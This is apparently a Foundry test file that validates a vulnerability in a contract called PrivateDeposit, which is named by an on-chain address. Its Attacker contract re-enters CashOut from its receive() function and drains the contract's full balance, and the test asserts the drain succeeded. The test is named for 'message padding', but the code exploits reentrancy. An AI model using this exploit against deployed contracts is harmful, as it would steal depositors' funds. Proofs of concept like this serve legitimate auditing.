// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0x7a8721a9d64c74da899424c1b52acbf58ddc9782.sol";

contract MessagePaddingTest is Test {
    PrivateDeposit private depositContract;
    Attacker private attacker;

    function setUp() public {
        depositContract = new PrivateDeposit();
        attacker = new Attacker(address(depositContract));
    }

    function test_message_padding_vulnerability() public {
        // Fund attacker with 1 ether for the deposit
        vm.deal(address(attacker), 1 ether);
        
        // Make initial deposit
        attacker.deposit(1 ether);
        
        // Pre-attack check: contract should hold 1 ether
        assertEq(address(depositContract).balance, 1 ether, "Initial deposit failed");
        
        console.log("--- BEFORE-Trigger Balances ---");
        uint256 contractBalanceBefore = address(depositContract).balance;
        uint256 attackerBalanceBefore = address(attacker).balance;
        console.log("Contract balance (before attack): %s", contractBalanceBefore);
        console.log("Attacker balance (before attack): %s", attackerBalanceBefore);
        
        console.log("--- Trigger Attack Operation ---");
        // Execute the attack
        attacker.attack();
        
        console.log("--- AFTER-Trigger Balances ---");
        uint256 contractBalanceAfter = address(depositContract).balance;
        uint256 attackerBalanceAfter = address(attacker).balance;
        console.log("Contract balance (after attack): %s", contractBalanceAfter);
        console.log("Attacker balance (after attack): %s", attackerBalanceAfter);
        
        // Differential validation
        bool fundsTransferred = contractBalanceAfter == 0 && attackerBalanceAfter == attackerBalanceBefore + 1 ether;
        console.log("Vulnerability validation: %s", fundsTransferred ? "SUCCESS" : "FAILED");
        
        // Final verdict
        if (fundsTransferred) {
            console.log("Vulnerability Exists: Contract funds were successfully drained to attacker");
        } else {
            console.log("Vulnerability not Exist: Contract funds were not drained as expected");
        }
        
        // Post-attack check: contract should be drained
        assertEq(address(depositContract).balance, 0, "Vulnerability not exploited - contract not drained");
    }
}

contract Attacker {
    PrivateDeposit private target;
    bool private reentrancy;

    constructor(address _target) {
        target = PrivateDeposit(payable(_target));
    }

    function deposit(uint256 amount) public payable {
        // Make deposit to target contract
        target.Deposit{value: amount}();
    }

    function attack() public {
        // Start by cashing out 0.5 ether to trigger reentrancy
        target.CashOut(0.5 ether);
    }

    receive() external payable {
        if (!reentrancy) {
            reentrancy = true;
            // Re-entrancy: cash out remaining 0.5 ether
            target.CashOut(0.5 ether);
        }
    }
}